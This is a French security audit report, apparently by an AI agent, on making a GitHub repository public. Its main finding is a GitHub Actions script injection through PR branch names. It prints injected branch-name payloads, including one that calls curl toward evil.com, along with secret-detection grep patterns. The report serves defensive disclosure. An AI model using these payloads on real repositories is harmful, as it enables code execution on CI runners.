# Audit sécurité — US-00.7 (application de la protection de branche)

| | |
|---|---|
| **US** | US-00.7 — application de la protection de la branche `main` |
| **Agent** | @CyberSecurity — contexte frais (Constitution Art. 2) |
| **Modèle** | claude-opus-5[1m] |
| **Date** | 2026-07-28 |
| **Périmètre audité** | `git diff f4400ca..HEAD` — **47 fichiers, 7056 insertions, 256 suppressions** (vérifié, non repris sur parole) |
| **HEAD** | `2dea2bb` · `main` = `9fdb7fd` (branche post-fusion : `main...HEAD` n'aurait montré que 6 fichiers) |

## VERDICT : ❌ **FAILED**

**1 bloquant HIGH.** Une injection de commande exploitable **par un attaquant anonyme** existe dans
`.github/workflows/branch-naming.yml`. Le fichier est **préexistant** et **hors du diff**, mais
**cette US a créé son exposition** : elle a rendu le dépôt **PUBLIC** (`allow_forking: true`) et a
fait de `check-branch-name` un **status check REQUIS**, donc exécuté sur **chaque** PR, y compris
celles issues de forks. Le modèle de menace du dépôt entier a changé dans cette US — évaluer la
surface ainsi exposée relève du périmètre de cet audit.

Ce verdict ne remet en cause **ni la valeur, ni l'honnêteté** du travail d'US-00.7, dont la qualité
de preuve est remarquable (voir §Points forts). Il porte sur **un défaut atteignable** que le
passage en public rend exploitable **aujourd'hui**.

---

## 1. Sorties d'outils (réelles, non résumées)

### 1.1 `python scripts/run_gates.py --gate sast` → **le gate n'existe pas**

```
[ERREUR] aucun gate ne correspond (vérifier factory.config.json / --component / --gate).
=== EXIT: 1 ===
```

Gates réellement déclarés dans `factory.config.json` (`adapter.components.app.gates`) :

```
COMPONENT: app | path: .
   gate: format      -> {"cmd": "dart format --output=none --set-exit-if-changed lib test"}
   gate: analyze     -> {"cmd": "flutter analyze"}
   gate: test        -> {"cmd": "flutter test --coverage && python scripts/check_flutter_coverage.py --min 80"}
   gate: deps_audit  -> {"cmd": "dart pub outdated --show-all", "blocking": false}
   gate: build       -> {"cmd": "flutter build web --release"}
```

> **Constat de couverture (LOW-9)** : **aucun gate SAST n'existe** dans cette factory. Il n'y a ni
> analyseur de sécurité Python (bandit / semgrep) sur `scripts/**`, ni **linter de workflows**
> (`actionlint` / `zizmor`) sur `.github/workflows/**`. C'est la **cause racine directe** de la
> non-détection de HIGH-1 : `actionlint` et `zizmor` détectent tous deux l'injection
> `${{ github.head_ref }}` en règle par défaut. J'ai exécuté les équivalents disponibles ci-dessous.

### 1.2 `python scripts/run_gates.py --gate analyze` (analyse statique disponible)

```
▶ app.analyze — (.) $ flutter analyze
Analyzing Concentration...
No issues found! (ran in 11.5s)
✅ app.analyze
Tous les gates bloquants passent (1 exécutés).
=== EXIT: 0 ===
```

### 1.3 `python scripts/run_gates.py --gate deps_audit`

```
▶ app.deps_audit — (.) $ dart pub outdated --show-all
direct dependencies:
cupertino_icons               1.0.9     1.0.9       1.0.9       1.0.9
flutter                       (sdk)     (sdk)       (sdk)       (sdk)
dev_dependencies:
flutter_lints                 6.0.0     6.0.0       6.0.0       6.0.0
flutter_test                  (sdk)     (sdk)       (sdk)       (sdk)
transitive dependencies:
meta                          *1.18.0   *1.18.0     *1.18.0     1.19.0
vector_math                   *2.2.0    *2.2.0      *2.2.0      2.4.1
[…] test_api *0.7.11 · matcher *0.12.19
You are already using the newest resolvable versions listed in the 'Resolvable' column.
✅ app.deps_audit
=== EXIT: 0 ===
```

**Analyse.** **Aucune CVE HIGH/CRITICAL sur dépendance directe** — les 2 dépendances directes
(`cupertino_icons`, `flutter_lints`) sont à jour. Les 4 retards (`meta`, `vector_math`, `matcher`,
`test_api`) sont **transitifs** et **contraints par le SDK Flutter** (colonne `Resolvable` = version
courante) : non actionnables, sans avis de sécurité connu. ⚠️ Noter que ce gate est
`"blocking": false` et que `dart pub outdated` est un détecteur d'**obsolescence**, **pas** un
scanner de vulnérabilités : il ne consulte aucune base d'avis. **Aucun PASS n'est donc prononcé sur
la foi d'un scan de CVE — il n'y en a pas.** Le risque réel est faible (surface applicative quasi
nulle à ce stade), mais la **capacité de détection est absente** (voir LOW-9).

### 1.4 `gitleaks` 8.30.1 — arbre de travail

```
$ gitleaks detect --no-git --source . --config .gitleaks.toml --redact -v
INF scanned ~120099792 bytes (120.10 MB) in 10s
INF no leaks found
=== EXIT: 0 ===
```

### 1.5 `gitleaks` — **historique git complet** (contrôle décisif : le dépôt est public)

```
$ gitleaks detect --source . --config .gitleaks.toml --redact -v
INF 47 commits scanned.
INF scanned ~2044021 bytes (2.04 MB) in 3.6s
INF no leaks found
=== EXIT: 0 ===
```

> **Note de méthode, par honnêteté** : `git rev-list --count HEAD` = **62** commits, gitleaks en
> annonce **47**. L'écart correspond aux **commits de fusion**, dont `git log -p` n'émet pas le
> diff. Un « evil merge » (contenu introduit dans le commit de fusion lui-même) échapperait donc à
> ce scan. Aucun indice n'en suggère la présence ici, mais la couverture n'est pas de 100 %.

### 1.6 Recherche manuelle de motifs sensibles sur **tout** le diff de l'US

```
$ git diff f4400ca..HEAD | grep -nEi "(ghp_|gho_|ghu_|ghs_|ghr_|github_pat_|x-access-token|
    Authorization:|Bearer |AIza|BEGIN .*PRIVATE KEY|password[:=]|secret[:=]|api[_-]?key[:=]|token[:=])"
```

**6 occurrences, toutes documentaires** — ce sont les mentions du contrôle lui-même (« aucun `ghp_`
/`github_pat_`/`gho_`, aucun en-tête `Authorization` »), pas des valeurs. **Zéro secret.**

### 1.7 Contrôle négatif exigé par le corpus — `--check-remote` hors CI

```
$ grep -rn "check-remote" .github/workflows/
--- fin (vide=OK) ---
```

✅ **Vide** : la commande à droits admin n'a pas été introduite en CI (elle y produirait un faux
rouge permanent). Le contrôle négatif tient.

### 1.8 Exécution réelle des fixtures NB-1 (dette déclarée — vérifiée, non crue)

Scénario A (cible amputée de `enforce_admins`, réel `enabled: true` → **ACTIF**) :

```
[SIMULATION] VERIFICATION IMPOSSIBLE — ce n'est PAS un succès
[SIMULATION]   Code HTTP : 200 — MAPPING INCOMPLET — la réponse GET porte 1 champ(s) ACTIF(S)
              non couvert(s) […] : enforce_admins = {"enabled": true}
[SIMULATION] CODE DE SORTIE DU COMPARATEUR : 2
=== EXIT A: 2 ===
```
→ **Le correctif NB-1 fonctionne réellement.**

Scénario B (cible amputée, réel `enforce_admins.enabled: false` = **bypass admin AUTORISÉ**) :

```
[SIMULATION]   [IGNORÉ — NEUTRE] […] : allow_fork_syncing, block_creations, enforce_admins, lock_branch, […]
[SIMULATION] conforme à la cible générée — SOURCE SIMULÉE, n'atteste PAS l'état réel du dépôt
[SIMULATION] CODE DE SORTIE DU COMPARATEUR : 0
=== EXIT B: 0 ===
```

Scénario C (cible amputée, réel **sans** `required_pull_request_reviews` = **aucune PR exigée**) :

```
[SIMULATION] conforme à la cible générée — SOURCE SIMULÉE, n'atteste PAS l'état réel du dépôt
[SIMULATION] CODE DE SORTIE DU COMPARATEUR : 0
=== EXIT C: 0 ===
```

→ **NB-1bis est CONFIRMÉ par exécution** : un relâchement réel sort en `exit 0`. Voir MED-3 pour
son exploitabilité, qui est **beaucoup plus faible** que ne le laisse craindre l'énoncé.

### 1.9 État réel de la plateforme (GET uniquement — aucune écriture émise par cet audit)

```
$ gh api repos/gitgdx/Concentration/actions/permissions/workflow
{"default_workflow_permissions":"read","can_approve_pull_request_reviews":false}

$ gh api repos/gitgdx/Concentration --jq '{private,visibility,fork,allow_forking}'
{"allow_forking":true,"fork":false,"private":false,"visibility":"public"}

$ gh api repos/gitgdx/Concentration/actions/permissions
{"enabled":true,"allowed_actions":"all","sha_pinning_required":false}
```

### 1.10 Complétude de la cible générée (compensation actuelle de NB-1bis)

```
cles cible      : allow_deletions, allow_force_pushes, enforce_admins, required_conversation_resolution,
                  required_linear_history, required_pull_request_reviews, required_status_checks, restrictions
MAPPED_TOP_KEYS : (identiques)
CIBLE COMPLETE (set==MAPPED) : True     ·     cles manquantes : []
```

---

## 2. Tableau des findings

`[Outil] | [Fichier:Ligne] | [Sévérité] | [Décision]`

| # | Outil | Fichier:Ligne | Sév. | Décision |
|---|---|---|---|---|
| **B-1** | Revue manuelle + PoC exécuté | `.github/workflows/branch-naming.yml:16` | **HIGH** | **BLOQUANT** |
| MED-2 | Revue manuelle | `scripts/factory_sync.py:60-77` + `:159-186` | MEDIUM | À corriger (US de dette) |
| MED-3 | Fixtures exécutées | `scripts/check_branch_protection.py:498-518` | MEDIUM | Dette déjà déclarée — maintenir ouverte |
| MED-4 | Revue manuelle + API | `.github/workflows/ci.yml:54,57,66,83` | MEDIUM | À corriger |
| MED-5 | `grep` + revue | `scripts/events_catalog.json` / `scripts/trace_append.py:35,81` | MEDIUM | Dette déjà déclarée — confirmée |
| LOW-6 | Revue manuelle | `.gitleaks.toml:44` | LOW | Recommandé |
| LOW-7 | Revue manuelle | `reports/US-00.7/applied_state/protection_applied.json` | LOW | Accepté (transparence assumée) |
| LOW-8 | Revue manuelle | `scripts/check_branch_protection.py:371-382` | LOW | Informationnel |
| LOW-9 | `run_gates.py` | `factory.config.json` (gates) | LOW | Recommandé (cause racine de B-1) |

---

## 3. Bloquant

### 🔴 B-1 — HIGH — Injection de commande via un nom de branche contrôlé par l'attaquant

**Fichier** : `.github/workflows/branch-naming.yml:15-16`

```yaml
if [ "${{ github.event_name }}" = "pull_request" ]; then
  BRANCH="${{ github.head_ref }}"
```

**Nature.** GitHub Actions substitue `${{ … }}` **textuellement dans le source du script shell**
*avant* de l'exécuter. `github.head_ref` est le **nom de la branche source d'une PR**, donc une
valeur **entièrement contrôlée par l'auteur de la PR** — y compris depuis un **fork**.
(CWE-78 / *GitHub Actions script injection*.)

**Exploitabilité — prouvée, pas supposée.** Deux vérifications exécutées :

1. Git **accepte** les noms de branche porteurs de métacaractères shell (`git check-ref-format`
   n'interdit ni `$`, ni `(`, ni `` ` ``, ni `"`) :

```
feat/US-1.1-$(id)                        => ACCEPTE PAR GIT
feat/US-1.1-`id`                         => ACCEPTE PAR GIT
feat/US-1.1-";id;"                       => ACCEPTE PAR GIT
feat/US-1.1-$(curl${IFS}evil.com)        => ACCEPTE PAR GIT
```

2. L'interpolation résultante **exécute** la charge — les guillemets doubles **ne protègent pas**
   de la substitution de commande :

```
$ HEAD_REF='feat/US-1.1-$(id -un)'; bash -c "BRANCH=\"$HEAD_REF\"; echo \"Checking branch: \$BRANCH\""
Checking branch: feat/US-1.1-guillaume.decroix
```

`$(id -un)` a été **exécuté** au lieu d'être affiché littéralement. Le PoC est resté **local et
inoffensif** : **aucune** branche, **aucune** PR n'a été créée sur le dépôt.

Pire : une charge nommée `feat/US-1.1-$(…)` **satisfait aussi le motif** `^feat/US-[0-9]+\.[0-9]+.*$`,
donc le job **réussit** — l'attaque ne laisse **aucun check rouge** derrière elle.

**Pourquoi c'est atteignable aujourd'hui, et pourquoi c'est le fait d'US-00.7.**
`visibility: public` + `allow_forking: true` : n'importe qui peut forker et ouvrir une PR. Le
trigger `pull_request` (types `opened, edited, synchronize, reopened`) déclenche le workflow, et
`check-branch-name` est désormais **status check REQUIS** — son exécution est **garantie** sur
chaque PR. Avant cette US, le dépôt était privé : la surface n'existait pas.

**Atténuations réelles (elles font la différence entre HIGH et CRITICAL)** :
- `default_workflow_permissions: "read"` → le `GITHUB_TOKEN` injecté est en **lecture seule**, et
  `can_approve_pull_request_reviews: false`. Pas d'écriture au dépôt, pas d'auto-approbation.
- **Aucun secret** n'est monté dans ce job (pas de bloc `env:` avec `secrets.*`).
- GitHub exige par défaut une **approbation manuelle** pour les workflows des *first-time
  contributors* — ce qui **retarde** l'attaque sans l'empêcher (un contributeur déjà fusionné, ou
  tout collaborateur poussant une branche via le trigger `push`, passe sans approbation).

**Impact résiduel** : exécution de code arbitraire sur le runner → abus de ressources, **poisoning
du cache Actions** (partagé avec les jobs `flutter-action`, donc pivot possible vers `app-quality`,
un check **requis**), reconnaissance interne.

**Correctif (3 lignes, sans changement de comportement)** — passer la valeur par l'environnement,
jamais par l'interpolation dans le source :

```yaml
- name: 🔍 Validate Branch Name
  env:
    HEAD_REF: ${{ github.head_ref }}
    REF_NAME: ${{ github.ref_name }}
  run: |
    if [ "$GITHUB_EVENT_NAME" = "pull_request" ]; then
      BRANCH="$HEAD_REF"
    else
      BRANCH="$REF_NAME"
    fi
```

En `env:`, la valeur devient une **donnée** pour le shell, jamais du **code**.
⚠️ `.github/workflows/*` n'étant protégé ni par `protect_files.sh` ni par la Constitution
(dette Art. 6 déjà déclarée), ce correctif est **applicable sans lever de barrière**.

---

## 4. Findings non bloquants

### 🟠 MED-2 — Aucun **plancher** de sécurité : la conformité est relative à la cible, pas à une politique

`emit_branch_protection()` (`scripts/factory_sync.py:60-77`) construit la cible depuis
`factory.config.json` avec des défauts sûrs (`enforce_admins` → `True`, `allow_force_pushes` →
`False`)… mais **aucune valeur de configuration n'est refusée**. `enforce_admins: false` dans la
config produirait une cible `enforce_admins: false`, un `PUT` qui **désarme le contrôle**, et un
`--check-remote` répondant **« conforme »** — car le comparateur vérifie la **cohérence
config ↔ dépôt**, jamais un **niveau minimal**.

`do_check()` (`:159-186`) ne compare que la config à ses **projections** (`.env`, bloc de
`GIT_PROTECTION.md`, libellés de jobs, seuils) : un abaissement accompagné d'un `--write` laisse la
CI **verte**. *(Raisonné par lecture du code ; non exécuté, car cela aurait exigé de modifier
`factory.config.json` — hors de mon périmètre.)*

**Aggravant** : `required_approving_review_count: 0` → l'auteur d'une PR peut **fusionner seul**
l'abaissement de la politique de sécurité, sans **aucune** revue. Il n'existe donc **pas de
séparation des tâches** sur la politique de sécurité elle-même.

**Recommandation** : une assertion de plancher dans `emit_branch_protection()` (refus dur si
`enforce_admins != True`, `allow_force_pushes != False`, `allow_deletions != False`, ou si
`required_pull_request_reviews` est absent), et/ou un `CODEOWNERS` sur `factory.config.json`.

### 🟠 MED-3 — NB-1bis : faux vert résiduel réel, mais **non exploitable par configuration**

Confirmé par exécution (§1.8) : scénarios B et C → `exit 0` sur une protection relâchée.

**Mais l'exploitabilité réelle est nettement plus faible que l'énoncé de la dette ne le suggère** —
et c'est le point que cet audit apporte : le déclencheur est une **cible amputée**, or les **8 clés
du payload sont écrites en dur dans le code** (`scripts/factory_sync.py:62-76`, littéral `payload =
{…}`). **Aucune valeur de `factory.config.json` ne peut retirer une clé.** Vérifié : `set(payload)
== MAPPED_TOP_KEYS` → `True` (§1.10). Amputer la cible exige donc de **modifier le code Python**,
ce qui passe par une PR soumise aux 4 checks requis.

→ **MEDIUM, pas HIGH.** La déclaration de dette faite par l'US est **exacte et honnête** ; la
compensation qu'elle invoque (cible non amputée) est **structurelle**, pas seulement circonstancielle.
Maintenir la dette ouverte (correctif : complétude de la cible dans `_guard_mapping`).

### 🟠 MED-4 — Chaîne d'approvisionnement CI : actions tierces non épinglées

`allowed_actions: "all"`, `sha_pinning_required: false`, et toutes les actions référencées par
**tag mutable** : `actions/checkout@v4`, `actions/setup-python@v5`, `gitleaks/gitleaks-action@v2`,
`subosito/flutter-action@v2`. Un tag peut être **redirigé** par le mainteneur amont ou un attaquant
qui le compromet.

Aggravant spécifique : `gitleaks/gitleaks-action@v2` s'exécute avec **`pull-requests: write`**
(`ci.yml:52`) — la permission la plus élevée du dépôt. Et depuis cette US, ces jobs sont des checks
**requis** : la CI est désormais sur le **chemin critique** de l'enforcement.

**Recommandation** : épingler par SHA complet (`uses: actions/checkout@<sha40>`) et activer
`sha_pinning_required`.

### 🟠 MED-5 — `emitter` non enforced : une dérogation peut être auto-accordée par un agent

**Confirmé par exécution** — `grep -rn "emitter" scripts/ .claude/hooks/` (hors le catalogue
lui-même) renvoie **0 occurrence**. Le catalogue déclare pourtant :

```json
{ "name": "EVT_WAIVER_GRANTED", "emitter": "human", "consumers": ["*"], "preconditions": [],
  "description": "Dérogation accordée par un HUMAIN uniquement […] (Constitution Art. 5)." }
```

`trace_append.py:35` définit `--agent` comme un **argument libre** (`required=True`, aucune
validation) recopié tel quel en `:81`. **Rien ne vérifie que l'émetteur déclaré correspond à
`emitter`.** Un agent peut donc s'accorder une dérogation Art. 5 — et, faute d'événement
d'extinction (dette déjà déclarée), celle-ci est **irrévocable par construction**.

C'est l'analogue, dans le système de gouvernance, d'un **endpoint sans contrôle d'autorisation**.
Je le classe **MEDIUM et non HIGH** en toute honnêteté : il n'existe ici **aucune frontière de
privilège technique** — agents et humain partagent le même poste, le même compte et les mêmes
droits fichiers. C'est une garantie de **process**, pas une barrière machine, et aucune
implémentation de `emitter` ne la rendrait infranchissable. Le durcissement utile est la
**détection** (validation par `validate_trace.py`), pas la prévention.

**Vérification effectuée** : `python scripts/validate_trace.py --us US-00.7` → `Traçabilité
conforme.` (7 événements, cohérents ; aucun `EVT_WAIVER_GRANTED` sur cette US).
**Aucun événement de test n'a été émis par cet audit** — je n'ai pas voulu polluer une trace
append-only pour démontrer un défaut déjà établi par lecture du code.

### 🟡 LOW-6 — Allowlist `gitleaks` par chemin sur `.env`

`.gitleaks.toml:44` place `'''\.env$'''` en **allowlist de chemin**. Si un `.env` était un jour
ajouté à l'index (`git add -f`, ou `.gitignore` modifié), **gitleaks ne l'inspecterait pas** — la
barrière tomberait précisément sur le fichier le plus dangereux. Le risque était théorique sur un
dépôt privé ; **il ne l'est plus** : une publication est **irréversible**.
**Recommandation** : retirer cette entrée (le `.gitignore` suffit à ne pas le suivre) et conserver
la détection en défense en profondeur.

### 🟡 LOW-7 — Divulgation de la posture de sécurité (accepté)

`reports/US-00.7/applied_state/protection_applied.json` publie la configuration exacte de
protection, normalement réservée aux admins : `required_approving_review_count: 0`,
`required_signatures: false`, `require_code_owner_reviews: false`. Un attaquant apprend donc
qu'**aucune revue humaine ni signature** n'est exigée.
**Incrément de risque quasi nul** — `factory.config.json` est public et porte déjà ces valeurs — et
la transparence probante est un **choix assumé** de la factory. **Accepté, aucune action.**

### 🟡 LOW-8 — `Authorization` conservé sur redirection (chemin de repli)

`_get_via_urllib()` (`check_branch_protection.py:371-382`) envoie `Authorization: Bearer <token>` via
`urllib`, qui **suit les redirections en conservant les en-têtes personnalisés**. Une redirection
vers un hôte tiers exfiltrerait le jeton. **Très faible** : chemin de **repli** (seulement si `gh`
est absent), `API_ROOT` est constant en `https://api.github.com`, l'hôte ne peut pas être manipulé
(`path.lstrip('/')`), et GitHub ne redirige pas hors domaine. Informationnel.

### 🟡 LOW-9 — Aucun SAST dans la factory (cause racine de B-1)

Voir §1.1. Ajouter `actionlint` (ou `zizmor`) sur `.github/workflows/**` aurait détecté **B-1
automatiquement**, et `bandit`/`semgrep` couvrirait `scripts/**`. À planifier avec la dette
« `selftest` en CI » déjà identifiée.

---

## 5. Points forts — vérifiés, à porter au crédit de l'US

Un audit honnête doit dire ce qui tient. Tout ce qui suit a été **contrôlé**, pas supposé :

1. **Aucun secret, nulle part.** `gitleaks` vert sur l'arbre **et** l'historique ; recherche
   manuelle de 14 motifs sur les 7056 lignes du diff → **0 valeur sensible**. Les artefacts
   d'API archivés (`entry_state/`, `applied_state/`) ne contiennent **ni jeton, ni en-tête
   `Authorization`, ni URL interne** — chacun porte même une ligne de rédaction explicite. Sur un
   dépôt devenu public, **c'est le risque n° 1 et il est maîtrisé.**
2. **`check_branch_protection.py` est réellement en lecture seule.** Aucun `-X`, `--method`, `PUT`,
   `POST`, `PATCH` ni `DELETE` atteignable : les 20 occurrences de « PUT » sont **documentaires**
   (mapping `PUT → GET`). `method="GET"` est explicite (`:379`), `subprocess` est invoqué par
   **liste d'arguments** (jamais `shell=True`), et le jeton n'est **jamais** archivé — la trace de
   commande porte littéralement `Authorization: Bearer <JETON NON ARCHIVÉ>` (`:368`).
   **Aucun chemin d'écriture n'a été introduit.**
3. **`apply_branch_protection.sh` ne manipule aucun jeton.** L'authentification est **déléguée à
   `gh`** ; le payload est **généré** puis passé par `stdin` (`--input -`), jamais écrit sur disque
   ni exposé en argument. `set -e` présent. **Aucune fuite.**
4. **Le correctif NB-1 fonctionne** (exit 2 prouvé, §1.8), et son périmètre exact — 3 lignes, pas
   « une » — est décrit sans embellissement.
5. **Aucun `pull_request_target`** dans les workflows : le vecteur « pwn request » (le plus grave
   des risques CI sur dépôt public) est **absent**. Combiné à `default_workflow_permissions: read`,
   la posture CI est **fail-closed**.
6. **Le contrôle négatif tient** : `check-remote` reste absent de `.github/workflows/`.
7. **Qualité de preuve exemplaire.** `negative_test_server.txt` **refuse** de revendiquer trois
   preuves distinctes là où il n'y en a qu'une, attribue correctement chaque refus, corrige une
   affirmation initiale fausse (« l'objet n'est jamais parvenu sur le serveur ») et **consigne un
   incident de procédure au lieu de le masquer**. La distinction objet transféré / référence
   refusée est techniquement juste. C'est le contraire d'un rapport complaisant.

---

## 6. Posture de sécurité de la protection appliquée — ce qu'elle couvre, ce qu'elle ne couvre pas

**Ce qui est réellement protégé** (état API vérifié §1.9 et `protection_applied.json`) : écriture
directe sur `main` impossible (PR obligatoire), 4 status checks requis, `strict: true` (branche à
jour avant fusion), `enforce_admins: true` (**administrateur inclus**), force-push et suppression
refusés, résolution des conversations exigée.

**Ce qui ne l'est PAS — et qu'aucune formulation ne doit laisser croire** :

| Angle mort | Conséquence |
|---|---|
| `required_approving_review_count: 0` | **Aucune revue humaine.** L'auteur fusionne seul. La protection garantit « la CI est verte », **pas** « quelqu'un d'autre a lu ». Pas de séparation des tâches (cf. MED-2). |
| `required_signatures: false` | Aucune garantie d'authenticité d'auteur ; identité de commit falsifiable. |
| `require_code_owner_reviews: false` + pas de `CODEOWNERS` | Les fichiers d'enforcement (`factory.config.json`, `.github/workflows/**`) n'ont **aucun gardien désigné**. |
| Sécurité = **intégrité de la CI** | Les 4 checks sont désormais la **seule** barrière substantielle → toute faiblesse CI (B-1, MED-4) devient une faiblesse de l'enforcement. C'est ce qui rend B-1 bloquant. |
| Pas de détection de dérive | Un admin peut retirer la protection **sans alerte** (dette déjà déclarée ; `--check-remote` est manuel et hors CI). |
| **Conditionnel à la visibilité publique** | Un retour en privé ramène le `403`, **désactive** la protection et **rouvre** la dérogation. La sécurité repose sur une exposition permanente et irréversible de l'historique. |

**Sur la surface fork** (signalée par le demandeur) : le blocage structurel des PR de fork est un
inconvénient de **contribution**, non une faille — la posture est **fail-closed**. Mais il crée une
**asymétrie** : le workflow vulnérable (B-1) **s'exécute** pour un attaquant externe, alors que sa
PR légitime ne pourrait jamais être fusionnée. **L'attaquant obtient l'exécution sans jamais avoir
besoin de la fusion.**

---

## 7. Conclusion

**VERDICT : FAILED** — 1 bloquant **HIGH** (B-1).

| Sévérité | Nombre |
|---|---|
| CRITICAL | 0 |
| **HIGH** | **1** (bloquant) |
| MEDIUM | 4 |
| LOW | 4 |

**Le travail d'US-00.7 est solide et sa preuve est honnête** : la protection est réellement
appliquée, son effet réellement prouvé, aucun secret n'a fuité malgré le passage en public, et
l'outil de preuve est bien en lecture seule. Le blocage tient à **une conséquence non traitée** de
la décision centrale de l'US : rendre le dépôt public a exposé un workflow vulnérable à l'injection,
et rendre ses checks obligatoires en a garanti l'exécution.

**Levée du blocage** : appliquer le correctif `env:` de §3 (3 lignes,
`.github/workflows/branch-naming.yml`), puis re-audit sécurité. Aucun autre finding n'est bloquant.

**Recommandé dans la foulée** (non bloquant) : LOW-9 (`actionlint` en CI — il aurait trouvé B-1
seul) et MED-4 (épinglage SHA), de préférence dans la même US de dette que NB-1bis et le `selftest`.
